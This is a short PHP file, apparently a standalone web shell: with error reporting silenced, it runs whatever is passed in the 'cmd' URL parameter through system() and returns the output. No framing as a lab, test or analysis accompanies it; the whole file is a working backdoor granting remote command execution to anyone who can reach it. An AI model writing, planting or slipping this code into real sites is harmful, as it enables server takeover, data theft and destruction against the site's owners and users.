<?php
@error_reporting(0);
if(isset($_GET['cmd'])) {
    @system($_GET['cmd']);
    exit;
}
?>
